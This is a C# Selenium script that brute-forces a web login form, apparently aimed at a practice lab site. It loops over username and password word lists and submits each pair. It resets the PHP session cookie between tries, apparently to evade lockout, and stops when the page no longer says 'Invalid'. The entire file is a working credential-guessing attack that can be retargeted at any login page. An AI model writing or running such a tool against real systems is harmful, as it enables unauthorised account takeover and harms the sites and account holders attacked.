using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
class Program
{
    static void Main()
    {
        List<string> usernames = File.ReadAllLines("usernames.txt").ToList();
        List<string> passwords = File.ReadAllLines("passwords.txt").ToList();
        while (true)
        {
            using (IWebDriver driver = new ChromeDriver())
            {
                driver.Navigate().GoToUrl("https://0xhunter.me/lab/");
                foreach (string username in usernames)
                {
                    foreach (string password in passwords)
                    {
                        IWebElement usernameInput = driver.FindElement(By.Name("username"));
                        IWebElement passwordInput = driver.FindElement(By.Name("password"));
                        usernameInput.Clear();
                        passwordInput.Clear();
                        usernameInput.SendKeys(username);
                        passwordInput.SendKeys(password);
                        Console.WriteLine($"Attempt: Username - {username}, Password - {password}, Current URL: {driver.Url}");
                        IWebElement loginButton = driver.FindElement(By.XPath("//button[@type='submit']"));
                        loginButton.Click();
                        IAlert alert = driver.SwitchTo().Alert();
                        Console.WriteLine($"Alert Text: {alert.Text}");
                        alert.Accept();
                        try
                        {
                            if (!driver.PageSource.Contains("Invalid"))
                            {
                                Console.WriteLine("Successful login!");
                                Console.ReadLine();
                                return;
                            }
                            IJavaScriptExecutor js = (IJavaScriptExecutor)driver;
                            js.ExecuteScript("document.cookie = 'PHPSESSID=; path=/';");
                            driver.Navigate().GoToUrl(driver.Url);
                        }
                        catch (UnhandledAlertException)
                        {
                        }
                    }
                }
            }
        }
    }
}
